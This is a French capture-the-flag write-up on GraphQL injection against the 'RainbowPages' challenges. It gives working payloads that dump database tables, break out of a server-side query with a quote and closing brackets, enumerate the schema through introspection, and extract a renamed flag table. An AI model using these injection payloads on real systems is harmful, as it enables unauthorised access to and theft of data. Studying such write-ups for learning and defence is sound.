# RainbowPages

## Script

J'ai utilisé `rainbow.py` pour executer des requêtes simplement.

## Liens utiles (pour la v1 et la v2)
-   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/
-   https://graphql.org/learn/queries/
-   https://graphql.org/learn/schema/
-   https://graphql.org/learn/introspection/
-   https://spec.graphql.org/June2018/


## RainbowPages v1

Requête de base du site
```sh
{ allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}
```

Payload qui liste toute la table `allCooks`
```sql
{ allCooks { nodes { firstname, lastname, speciality, price }}}

{"data":{"allCooks":{"nodes":[{"firstname":"Thibault","lastname":"Royer","speciality":"Raji Cuisine","price":12421},{"firstname":"Antoinette","lastname":"Martineau","speciality":"French traditional","price":3829},{"firstname":"Bernard","lastname":"Bruneau","speciality":"Chinese and Thai","price":14100},{"firstname":"Trycia","lastname":"Barton","speciality":"Fast food","price":920},{"firstname":"Jaleel","lastname":"Gerlach","speciality":"Tandoori dishes","price":24575},{"firstname":"Isaac","lastname":"Collier","speciality":"South Korean foods","price":8416},{"firstname":"Delbert","lastname":"Kshlerin","speciality":"Burger","price":31467},{"firstname":"Paula","lastname":"Hessel","speciality":"Pizza","price":74401},{"firstname":"Teagan","lastname":"Kertzmann","speciality":"Vegererian","price":12664},{"firstname":"Garfield","lastname":"Goldner","speciality":"Air and sun","price":944092},{"firstname":"Elisabeth","lastname":"Windler","speciality":"Vegetelian","price":310603},{"firstname":"Casey","lastname":"Schmitt","speciality":"Italian","price":96837},{"firstname":"Consuelo","lastname":"Kub","speciality":"Only Fruits","price":65607},{"firstname":"Luciano","lastname":"Smitham","speciality":"Brittany specialities","price":1963},{"firstname":"Piper","lastname":"Blick","speciality":"Breton gastronomy","price":77482},{"firstname":"Jace","lastname":"Jakubowski","speciality":"Sushi","price":20522}]}}}
```

Messages d'erreur qu'on peut trouver
```sql
{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":1,"column":14}]}]}

{"errors":[{"message":"Field \"allCooks\" of type \"CooksConnection\" must have a selection of subfields. Did you mean \"allCooks { ... }\"?","locations":[{"line":1,"column":3}]}]}
```

On copie ce message d'erreur sur google, on voit que c'est du graphQL.

On trouve ce github qui possède une requete pour dump la db https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection

J'ai mis le dump dans le fichier `rainbow.json`. On voit la table `allFlags`.

Payload qui récupère le flag
```sh
{ allFlags { nodes { id, flags}}}
```

## RainbowPages v2

La différence avec la v1 est que la requetes n'est pas envoyé côté client mais géré côté serveur.
De ce que j'ai compris, la requête est assez similaire à celle de la v1, mais plus compliqué.
On peut injecter un payload en mettant une `"`.

Le principe est de fermer les `{`, `(`, `[` pour injecter notre propre requete.

On va d'abord essayer de faire une 2eme requete comme celle de base, càd lister les prix des cuisiniers.

Par tatonnement, et en suivant les erreurs, on arrive à fermer la requete avec le bon ordre de `{`, `(`, `[`.

Si on remonte trop avec un payload du type `"}}]})} query { `. On a une erreur disant qu'on ne peut pas faire deux requêtes anonymes.
Ce n'est pas bon. On est remonté un cran trop haut.

On arrive donc à `}}]})`.

Voici un payload qui rècupère les prix des cuisiniers.
```sh
corentin"}}]}){nodes{firstname}} yo: allCooks { nodes { price} }     }#
```
Le `yo` est un alias arbitraire qui est necessaire lorsque l'on faire deux requetes (voir lien spec graphsql).
Le `#` mets en commentaire la fin de la requête.

La table `allFlags` n'existe pas, ils ont dû la renommer.
Direction l'introspection pour récuperer les infos sur db.

Ce payload liste les types de la db. On voit des `FlagNotTheSameTableName`, c'est la table qu'on cherche.
```sh
corentin"}}]}){nodes{firstname}} yo: __schema {types { name }}     }#
```

Avec ce payload on peut lister les champs (fields) de chaque type
```sh
corentin"}}]}){nodes{firstname}} yo: __type(name: "FlagNotTheSameTableName"){fields{name}}     }#
```

Il reste plus qu'à créer le payload final
```sh
corentin"}}]}){nodes{firstname}} yo: allFlagNotTheSameTableNames{nodes{flagNotTheSameFieldName}}     }#
```

Nb: j'ai toujours pas compris le jeu de mot avec `RainbowTables`
